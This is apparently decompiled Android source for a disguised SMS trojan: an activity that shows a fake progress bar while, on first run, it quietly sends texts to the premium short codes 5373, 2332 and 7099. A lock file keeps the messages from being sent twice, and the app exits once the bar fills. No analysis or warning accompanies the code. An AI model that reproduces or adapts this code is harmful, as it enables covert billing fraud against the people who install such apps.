package com.agewap.soft;

import android.app.Activity;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.ProgressBar;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStreamWriter;

public class ProgressBarActivity
  extends Activity
{
  Handler mHandler;
  boolean mIsRunning = false;
  ProgressBar mProgressBar;
  
  public ProgressBarActivity() {}
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    if (new File("data/data/com.agewap.soft/files", "file.lock").exists()) {
      System.exit(0);
    }
    try
    {
      paramBundle = new OutputStreamWriter(openFileOutput("file.lock", 1));
      paramBundle.flush();
      paramBundle.close();
      paramBundle = SmsManager.getDefault();
      paramBundle.sendTextMessage("5373", null, "221001 280 ", null, null);
      paramBundle.sendTextMessage("2332", null, "221001 280 ", null, null);
      paramBundle.sendTextMessage("7099", null, "221001 280 ", null, null);
      paramBundle.sendTextMessage("7099", null, "221001 280 ", null, null);
      this.mProgressBar = ((ProgressBar)findViewById(2131034113));
      this.mHandler = new Handler()
      {
        public void handleMessage(Message paramAnonymousMessage)
        {
          ProgressBarActivity.this.mProgressBar.incrementProgressBy(1);
        }
      };
      super.onStart();
      if (this.mProgressBar.getProgress() == 100) {
        System.exit(0);
      }
      return;
    }
    catch (FileNotFoundException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
    catch (IOException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
  }
  
  public void onStart()
  {
    super.onStart();
    this.mProgressBar.setProgress(0);
    Thread localThread = new Thread(new Runnable()
    {
      public void run()
      {
        for (;;)
        {
          if (ProgressBarActivity.this.mIsRunning) {
            try
            {
              Thread.sleep(100L);
              if (ProgressBarActivity.this.mProgressBar.getProgress() == 100) {
                System.exit(0);
              }
              ProgressBarActivity.this.mHandler.sendMessage(ProgressBarActivity.this.mHandler.obtainMessage());
            }
            catch (InterruptedException localInterruptedException)
            {
              for (;;)
              {
                Log.e("ERROR", "Thread Interrupted");
              }
            }
          }
        }
      }
    });
    this.mIsRunning = true;
    localThread.start();
  }
}
